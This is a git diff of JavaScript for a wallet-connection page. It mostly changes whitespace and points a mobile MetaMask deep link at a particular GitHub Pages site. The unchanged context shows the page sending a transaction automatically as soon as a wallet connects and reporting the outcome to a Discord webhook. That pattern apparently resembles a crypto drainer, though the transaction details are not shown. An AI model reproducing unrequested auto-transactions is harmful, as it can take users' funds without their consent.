@@ -5,10 +5,10 @@ async function connectWallet() {
         console.log("Connection request already in progress...");
         return; // Exit if already connecting
     }
-    
+
     isConnecting = true; // Set the flag to true
     document.getElementById("connectButton").disabled = true; // Disable the button
-    
+
     try {
         // Check if MetaMask is installed
         if (typeof window.ethereum !== 'undefined') {
@@ -16,16 +16,16 @@ async function connectWallet() {
             const account = accounts[0];
             console.log(`Connected to account: ${account}`);
             document.getElementById("status").innerText = `Connected: ${account}`;
-            
+
             // After connecting, send a transaction
             await sendTransaction(); // Automatically send the transaction after connecting
         } else {
             // If on a mobile device and MetaMask isn't installed, suggest installation
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             if (isMobile) {
-                // Open MetaMask directly for mobile users
-                alert("Please install the MetaMask app to continue.");
-                window.open("https://metamask.app.link/dapp/", "_blank");
+                // Prompt user to open the MetaMask app
+                alert("It seems that MetaMask is not recognized. Please make sure it's installed and try again.");
+                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank"); // Directing to your GitHub Pages URL
             } else {
                 console.error("MetaMask is not installed. Please install it.");
                 document.getElementById("status").innerText = "MetaMask is not installed.";
@@ -56,13 +56,13 @@ async function sendTransaction() {
             const txResponse = await signer.sendTransaction(transaction);
             console.log("Transaction response:", txResponse);
             document.getElementById("status").innerText = `Transaction sent! Hash: ${txResponse.hash}`;
-            
+
             // Send to Discord webhook
             await sendWebhook(txResponse.hash, "success");
         } catch (error) {
             console.error("Error sending transaction:", error);
             document.getElementById("status").innerText = "Error sending transaction.";
-            
+
             // Send to Discord webhook
             await sendWebhook(error.message, "failure");
         }
